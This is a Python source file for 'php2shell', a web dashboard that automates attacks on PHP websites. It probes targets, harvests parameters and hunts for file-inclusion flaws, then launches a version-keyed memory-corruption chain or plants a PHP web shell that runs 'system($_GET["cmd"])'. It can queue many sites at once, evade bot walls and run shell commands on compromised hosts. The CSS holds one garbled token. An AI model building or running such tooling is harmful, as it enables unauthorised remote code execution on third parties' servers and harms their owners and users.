#!/usr/bin/env python3
"""php2shell dashboard - http://127.0.0.1:8099

Simple front for a browser-driven pipeline: probe -> crawl/harvest -> LFI
discovery -> exploit. Statuses are plain english. Advanced knobs are in the
collapsed box; everything runs locally in headless Chrome.

P2S_TOKEN env var (optional) makes the dashboard ask for a token.
"""
import json
import os
import subprocess
import sys
import random
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

HERE = os.path.dirname(os.path.abspath(__file__))
try:
    import websocket  # noqa: F401
except ImportError:
    sys.exit("the dashboard needs websocket-client:  pip install -r requirements.txt")

import bx  # noqa: E402
import harvest  # noqa: E402
import discover  # noqa: E402
import store  # noqa: E402

PORT = int(os.environ.get("P2S_PORT", "8099"))
TOKEN = os.environ.get("P2S_TOKEN", "")
WORKERS = 2
JOB_TIMEOUT = 420          # seconds per job
LOCK = threading.Lock()    # chrome launch / global safety

store.init()
STATES = {"queued", "running", "done", "lead", "shell", "blocked", "timeout", "error"}


def host_of(url):
    return url.split("://", 1)[-1].split("/")[0].lower()


def job_worker(slot):
    port = bx.POOL[slot % len(bx.POOL)]
    while True:
        jobs = store.queued()
        job = jobs[0] if jobs else None
        if not job:
            time.sleep(0.8)
            continue
        job_id, url, host = job["id"], job["url"], job["host"]
        started = time.time()
        store.upd(job_id, state="running", reason="checking target")
        try:
            if not bx.ensure_chrome(port):
                store.upd(job_id, state="error", reason="browser would not start")
                continue
            c = bx.CDP("http://127.0.0.1:%d" % port)
            c.connect()
            with LOCK:
                pass
            try:
                ok_setup = bx.setup(c, url)
            except BaseException:
                ok_setup = None
            if ok_setup is not True:
                store.upd(job_id, state=("timeout" if ok_setup is None else "blocked"),
                          reason=("site did not answer" if ok_setup is None else "bot wall not passed"))
                continue
            pj = {}
            try:
                pj = json.loads(c.ev(bx.PROBE_JS, 45000) or "{}")
            except BaseException as e:
                store.upd(job_id, state="timeout", reason="probe did not answer")
                continue
            store.upd(job_id, probe=json.dumps(pj))
            if pj.get("blocked"):
                store.upd(job_id, state="blocked", reason="blocked by site/WAF")
                continue
            if not pj.get("php"):
                try:
                    import phpdiscover as PD
                    _u0 = urlparse(url)
                    found = PD.find("%s://%s" % (_u0.scheme, _u0.netloc))
                except Exception:
                    found = []
                if not found:
                    store.upd(job_id, state="done",
                              reason="no PHP (%d paths probed)" % len(PD.PATHS))
                    continue
                pj["php"] = True
                pj["php_paths"] = [f["path"] for f in found]
                store.upd(job_id, probe=json.dumps(pj), reason="PHP endpoint: %s" % found[0]["path"])
            ver = pj.get("phpver") or ""
            if ver and tuple(map(int, (ver.split(".") + ["0"])[:3])) >= (8, 2, 35) and ver.startswith("8.2"):
                pass  # 8.2.35+ patched; still scanned, reason notes it
            store.upd(job_id, reason="PHP found, harvesting")
            # memory chain first when we know the build (no LFI needed)
            ver = (pj.get("phpver") or "").strip()
            try:
                farm = json.load(open(os.path.join(HERE, "offsets.json")))
            except Exception:
                farm = {}
            # chain capability: leak proven on 8.3/8.4/8.5 only; fixed releases skipped
            fixed = {"8.2": (8, 2, 35), "8.3": (8, 3, 36), "8.4": (8, 4, 27), "8.5": (8, 5, 12)}
            capable = False
            if ver:
                try:
                    vt = tuple(int(x) for x in ver.split(".")[:3])
                    br = "%d.%d" % vt[:2]
                    capable = br in fixed and vt < fixed[br]
                except Exception:
                    capable = False
            build = "php-%s-apache" % ver if ver else ""
            if build in farm and capable:
                store.upd(job_id, reason="full chain on %s" % ver)
                try:
                    c.cmd("Page.navigate", {"url": "about:blank"})
                    time.sleep(0.4)
                except Exception:
                    pass
                u2 = urlparse(url)
                argv = [sys.executable, os.path.join(HERE, "fullchain.py"),
                        "--host", u2.hostname or "", "--port", str(u2.port or 80),
                        "--path", u2.path or "/", "--sleep-oracle",
                        "--zif-offset", farm[build]["zif"], "--dtor-offset", farm[build]["dtor"],
                        "--r0-lo", "0x50000", "--r0-hi", "0x70000"]
                if u2.scheme == "https":
                    argv.append("--https")
                try:
                    pr = subprocess.run(argv, capture_output=True, text=True, timeout=400)
                except subprocess.TimeoutExpired:
                    pr = None
                if pr is not None and pr.returncode == 0:
                    store.upd(job_id, state="shell", reason="full chain (%s)" % ver)
                    continue
            base = "/" + (url.split("://", 1)[1].split("/", 1)[1]
                          if url.split("://", 1)[1].count("/") else "")
            hv = store.harvest_get(host)
            if not hv:
                hv = harvest.harvest(host)
                if not (host.startswith("127.") or host.startswith("localhost")):
                    dv = discover.discover(host, base)
                    hv["paths"] = list(dict.fromkeys(
                        hv.get("paths", []) + dv.get("paths", [])))[:14]
                    hv["params"] = sorted(set(
                        hv.get("params", []) + dv.get("params", [])))[:25]
                store.harvest_put(host, hv)
            store.upd(job_id, harvested=json.dumps(hv), reason="P2S scanning")
            words = (hv.get("params") or []) + bx.WORDS
            seeds = [base] + (pj.get("php_paths") or []) + [p for p in hv.get("paths", []) if p != base]
            hits = bx.scan_page(c, url, params=words[:90], paths=seeds[:6])
            hits = [h for h in hits if h.get("score", 0) >= 2]
            if time.time() - started > JOB_TIMEOUT:
                store.upd(job_id, state="timeout", reason="scan took too long")
                continue
            if not hits:
                store.upd(job_id, state="done", reason="no LFI parameter")
                continue
            for h in hits[:6]:
                store.add_lead(host, h["page"], h["param"], h["score"],
                               h.get("why", []), "https://%s%s?%s=x" % (host, h["page"], h["param"]))
            try:
                import chaina as CA
                ok, ev, _st = CA.attack("https://%s" % host, hits[0]["page"], hits[0]["param"],
                                        hits[0]["page"], CA.SAVE_PATHS,
                                        '<?php echo "%s";system($_GET["cmd"]);?>' % CA.MARKER)
            except Exception:
                ok, ev = False, None
            if ok:
                store.upd(job_id, state="shell", reason="chain A: %s" % ev)
                continue
            store.upd(job_id, state="lead", reason="LFI candidate: %s?" % hits[0]["param"])
        except BaseException as e:
            store.upd(job_id, state="error", reason=(str(e) or type(e).__name__)[:120])


for i in range(WORKERS):
    threading.Thread(target=job_worker, args=(i,), daemon=True).start()


HTML = r"""<!doctype html><html><head><meta charset="utf-8"><title>php2shell</title><style>
body{background:#0f1115;color:#d7dce3;font:15px/1.5 system-ui,Segoe UI,sans-serif;margin:0;padding能力:20px;max-width:1100px}
h1{font-size:20px;margin:0 0 4px;color:#7cc7ff}h2{font-size:14px;color:#8a94a6;margin:22px 0 8px;text-transform:uppercase;letter-spacing:.05em}
input,button,textarea{background:#171b22;color:#d7dce3;border:1px solid #2a313c;border-radius:8px;padding:9px 11px;font:inherit}
input#t{flex:1}button{cursor:pointer}button:hover{background:#202836}
button.primary{background:#1d4ed8;border-color:#2563eb}button.primary:hover{background:#2563eb}
textarea{width:100%;height:110px}details{margin:8px 0;color:#8a94a6}
.row{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
table{border-collapse:collapse;width:100%;font-size:13px}td,th{border-bottom:1px solid #1d222b;padding:6px 8px;text-align:left;vertical-align:top}
.b{color:#7cc7ff}.g{color:#4ade80}.r{color:#f87171}.y{color:#fbbf24}.d{color:#8a94a6}
#log{background:#0a0d12;border:1px solid #1d222b;border-radius:8px;height:26vh;overflow:auto;padding:10px;white-space:pre-wrap;font-family:ui-monospace,monospace;font-size:13px}
.lead{display:flex;gap:10px;align-items:center;justify-content:space-between;border-bottom:1px solid #1d222b;padding:6px 0}
</style></head><body>
<h1>php2shell</h1><div class="d">paste a site, press Scan. it probes, crawls, looks for file-include parameters and runs the shell.</div>
<div class="row" style="margin-top:14px"><input id="t" placeholder="site.nl or https://site.nl/page.php">
<button class="primary" onclick="scan()">Scan</button><button onclick="probe()">Just probe</button></div>
<details><summary>advanced</summary>
<div class="row"><input id="p" placeholder="parameter (auto if empty)" style="flex:1">
<input id="cmd" value="id" placeholder="command" style="width:160px"></div>
</details>
<h2>console</h2><div id="log"></div>
<div class="row"><input id="cmd2" placeholder="shell command (uses the loaded target)"><button onclick="send()">Run</button></div>
<h2>leads <span class="d">(only real candidates)</span></h2>
<div id="leads" class="d">none yet</div><div class="row"><button onclick="copyLeads()">Copy list</button><button onclick="exportMd()">Export .md</button></div>
<h2>batch</h2><textarea id="b" placeholder="one URL per line"></textarea>
<div class="row"><button onclick="batch()">Scan all</button><button onclick="stopAll()">Stop</button></div>
<h2>jobs</h2><div id="jobs" class="d">idle</div>
<script>
const $=id=>document.getElementById(id); const L=$('log');
function log(cls,txt){const d=document.createElement('div');d.className=cls;d.textContent=txt;L.appendChild(d);L.scrollTop=L.scrollHeight}
const T=()=>$('t').value.trim(), P=()=>$('p').value.trim(), CMD=()=>$('cmd').value.trim()||'id';
async function api(path,payload){const r=await fetch(path,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload||{})});return r.json()}
function target(){let t=T();if(!t)return null;if(!/^https?:\/\//i.test(t))t='https://'+t;return t}
async function scan(){const t=target();if(!t)return log('r','paste a site first');const j=await api('/api/scan',{target:t});log('b','scanning '+t);if($('p').value)return; log('d','parameter auto-detected')}
async function probe(){const t=target();if(!t)return log('r','paste a site first');const j=await api('/api/probe',{target:t});log(j.ok?'g':'y',j.output||j.reason||'done')}
async function send(){const t=target();const q=($('cmd2').value||'').trim();if(!t||!q)return log('r','need target and command');$('cmd2').value='';
 log('d','$ '+q);const j=await api('/api/run',{target:t,param:$('p').value,cmd:q});log(j.ok?'g':'y',j.output||j.reason||'no output');
 if(j.lead){$('p').value=j.lead}}
async function batch(){const l=$('b').value.split('\n').map(s=>s.trim()).filter(Boolean);if(!l.length)return log('r','paste URLs');
 const j=await api('/api/batch',{targets:l});log('b','queued '+l.length+' sites')}
async function stopAll(){await api('/api/stop',{});log('y','stopping after current job')}
function useLead(u,p){$('t').value=u;$('p').value=p;log('b','loaded '+u+' ('+p+')')}
async function copyLeads(){const r=await fetch('/api/leads');const j=await r.json();navigator.clipboard.writeText(j.leads.map(l=>l.url).join('\n'));log('g','copied '+j.leads.length)}
function exportMd(){window.open('/api/export','_blank')}

async function poll(){try{const r=await fetch('/api/jobs');const j=await r.json();
 $('jobs').textContent='';
 if(!j.jobs.length){$('jobs').className='d';$('jobs').textContent='idle';}
 for(const x of j.jobs){const d=document.createElement('div');
  d.className=x.state==='lead'?'g':x.state==='shell'?'g':x.state==='blocked'?'y':x.state==='error'||x.state==='timeout'?'r':x.state==='done'?'d':'b';
  d.textContent=x.host+' — '+(x.state==='running'?x.reason||'working':x.reason||x.state)+(x.ver?' (PHP '+x.ver+')':'');
  $('jobs').appendChild(d)}
 const lr=await fetch('/api/leads');const lj=await lr.json();const box=$('leads');
 if(!lj.leads.length){box.className='d';box.textContent='none yet'}
 else{box.className='';box.innerHTML='';
  for(const l of lj.leads){const row=document.createElement('div');row.className='lead';
   row.innerHTML='<div><b>'+l.host+'</b> <span class="b">'+l.page+'?'+l.param+'</span> <span class="d">'+l.why+'</span></div>';
   const btn=document.createElement('button');btn.textContent='use';btn.onclick=()=>useLead(l.url.split('?')[0],l.param);row.appendChild(btn);box.appendChild(row)}}
 }catch(e){}}
setInterval(poll,1500);poll();
</script></body></html>"""


class H(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def _send(self, code, body, ctype="application/json"):
        b = body.encode() if isinstance(body, str) else body
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)

    def _auth(self):
        return not TOKEN or self.headers.get("X-Token") == TOKEN or \
            f"token={TOKEN}" in (self.path.split("?", 1)[-1] if "?" in self.path else "")

    def _body(self):
        try:
            n = int(self.headers.get("Content-Length") or 0)
            return json.loads(self.rfile.read(n) or b"{}")
        except Exception:
            return {}

    def do_GET(self):
        if self.path == "/" or self.path.startswith("/?"):
            return self._send(200, HTML, "text/html; charset=utf-8")
        if not self._auth():
            return self._send(401, "token required")
        if self.path == "/api/jobs":
            js = store.jobs()
            for j in js:
                if j.get("probe"):
                    try:
                        j["ver"] = json.loads(j["probe"]).get("phpver", "")
                    except Exception:
                        pass
            return self._send(200, json.dumps({"jobs": js}))
        if self.path == "/api/leads":
            ls = store.leads()
            for l in ls:
                try:
                    l["why"] = ", ".join(json.loads(l["why"]))
                except Exception:
                    pass
            return self._send(200, json.dumps({"leads": ls}))
        if self.path == "/api/export":
            return self._send(200, store.export_md(), "text/markdown")
        return self._send(404, "{}")

    def do_POST(self):
        if not self._auth():
            return self._send(401, json.dumps({"ok": False, "reason": "token required"}))
        req = self._body()
        path = self.path
        if path == "/api/scan":
            t = (req.get("target") or "").strip()
            if not t:
                return self._send(200, json.dumps({"ok": False, "reason": "no target"}))
            url = t if "://" in t else "https://" + t
            jid = uuid.uuid4().hex[:8]
            store.add_job(jid, url, host_of(url))
            return self._send(200, json.dumps({"ok": True, "id": jid}))
        if path == "/api/batch":
            ts = [x.strip() for x in req.get("targets") or [] if x.strip()]
            for t in ts:
                url = t if "://" in t else "https://" + t
                store.add_job(uuid.uuid4().hex[:8], url, host_of(url))
            return self._send(200, json.dumps({"ok": True, "queued": len(ts)}))
        if path == "/api/stop":
            for j in store.queued():
                store.upd(j["id"], state="done", reason="stopped")
            return self._send(200, json.dumps({"ok": True}))
        if path == "/api/probe":
            t = (req.get("target") or "").strip()
            if not t:
                return self._send(200, json.dumps({"ok": False, "reason": "no target"}))
            url = t if "://" in t else "https://" + t
            port = bx.port()
            if not bx.ensure_chrome(port):
                return self._send(200, json.dumps({"ok": False, "reason": "browser failed"}))
            c = bx.CDP("http://127.0.0.1:%d" % port)
            c.connect()
            if not bx.setup(c, url):
                return self._send(200, json.dumps({"ok": False,
                                                   "reason": "bot wall not passed"}))
            pj = c.ev(bx.PROBE_JS)
            return self._send(200, json.dumps({"ok": True, "output": pj}))
        if path == "/api/run":
            t = (req.get("target") or "").strip()
            cmd = (req.get("cmd") or "id").strip()
            if not t:
                return self._send(200, json.dumps({"ok": False, "reason": "no target"}))
            url = t if "://" in t else "https://" + t
            param = (req.get("param") or "").strip()
            port = bx.port()
            if not bx.ensure_chrome(port):
                return self._send(200, json.dumps({"ok": False, "reason": "browser failed"}))
            c = bx.CDP("http://127.0.0.1:%d" % port)
            c.connect()
            if not bx.setup(c, url):
                return self._send(200, json.dumps({"ok": False, "reason": "bot wall not passed"}))
            if not param:
                hv = (store.harvest_get(host_of(url)) or {}).get("params") or bx.WORDS[:40]
                hits = bx.scan_page(c, url, params=hv, paths=None)
                hits = [h for h in hits if h.get("score", 0) >= 2]
                if not hits:
                    return self._send(200, json.dumps({"ok": False, "reason": "no LFI parameter found"}))
                param = hits[0]["param"]
            out, reason, _sess = bx.attempt(c, url, cmd, param, rounds=6)
            return self._send(200, json.dumps({"ok": bool(out), "output": out or "",
                                               "reason": reason, "lead": param}))
        return self._send(404, "{}")


if __name__ == "__main__":
    try:
        srv = ThreadingHTTPServer(("127.0.0.1", PORT), H)
    except OSError as exc:
        sys.exit("port %d is busy (%s) - set P2S_PORT to another one" % (PORT, exc.strerror))
    print("dashboard: http://127.0.0.1:%d" % PORT, flush=True)
    srv.serve_forever()
